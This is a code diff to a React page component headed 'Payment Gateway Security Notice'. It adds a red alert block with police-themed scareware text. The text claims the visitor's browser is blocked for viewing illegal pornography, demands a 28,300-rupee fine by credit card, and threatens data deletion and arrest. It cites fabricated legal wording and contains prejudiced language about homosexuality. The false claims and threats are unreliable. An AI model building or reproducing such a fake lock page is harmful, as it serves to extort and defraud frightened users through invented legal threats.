@@ -5,13 +5,24 @@ const LeftContent = () => {
   return (
     <div className="flex-1 p-6 bg-gray-50">
       <div className="max-w-2xl">
+        {/* Red Alert Message */}
+        <div className="bg-red-600 text-white p-4 rounded mb-6">
+          <p className="text-sm leading-relaxed">
+            Your browser has been blocked due to repeated visits to pornographic sites containing materials prohibited by the laws of the India, namely, pornography promoting pedophilia, violence and homosexuality.
+            You must pay a fine of Indian rupee 28300 by credit card as prescribed by IPC section 292 and 293.
+            Attention! If you fail to pay a fine or attempt to unblock your computer without paying a fine, all information on your device will be permanently deleted in order to prevent the dissemination of pornography.
+            The police will come to your home to arrest you and criminal charges will be filed against you. Your device will be unlocked automatically after the fine is paid.
+            Section 292 (1) A person who distributes or displays in public obscene objects such as documents, drawings or recording media contained in electronic or magnetic records is punished by imprisonment for not more than 2 years, a fine of not more than 250,000 Indian rupee or paltry fine, or both imprisonment and a fine. The same applies to a person who distributes obscene records including electronic or magnetic records through the transmission of telecommunications.
+            (2) The same applies to a person who possesses the objects referred to in the preceding paragraph or stores electronic or magnetic records referred to in the same paragraph for the purpose of viewing them.
+            Your browser will be unlocked automatically after the fine payment.
+            Attention! In case of non-payment of the fine, or your attempts to unlock the device independently , case materials will be transfered to Ministry of Law for the institution of criminal proceedings against you due to commitment a crime.
+          </p>
+        </div>
+
         <div className="flex items-center mb-2">
           <h2 className="text-xl font-bold text-gray-800">
             Payment Gateway Security Notice
           </h2>
-          <span className="ml-4 bg-red-600 text-white px-4 py-2 text-sm font-bold rounded">
-            YOUR COMPUTER HAS BEEN BLOCKED
-          </span>
         </div>
         
         <p className="text-xs text-black mb-4 font-normal">
